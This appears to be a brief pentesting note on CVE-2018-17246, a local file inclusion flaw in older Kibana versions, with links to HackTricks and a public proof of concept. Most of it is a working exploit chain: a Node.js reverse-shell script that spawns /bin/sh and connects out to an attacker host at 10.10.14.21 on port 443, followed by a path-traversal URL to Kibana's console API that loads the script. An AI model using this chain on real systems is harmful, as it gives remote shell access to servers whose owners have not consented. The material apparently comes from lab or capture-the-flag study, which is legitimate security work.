____

https://book.hacktricks.xyz/network-services-pentesting/5601-pentesting-kibana

# CVE-2018-17246

Kibana LFI < 6.4.3 & 5.6.13

https://www.cyberark.com/resources/threat-research-blog/execute-this-i-know-you-have-it

https://github.com/mpgn/CVE-2018-17246

```bash
cd /tmp
nano shell.js
```

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(443, "10.10.14.21", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

```txt
http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../tmp/shell.js
```



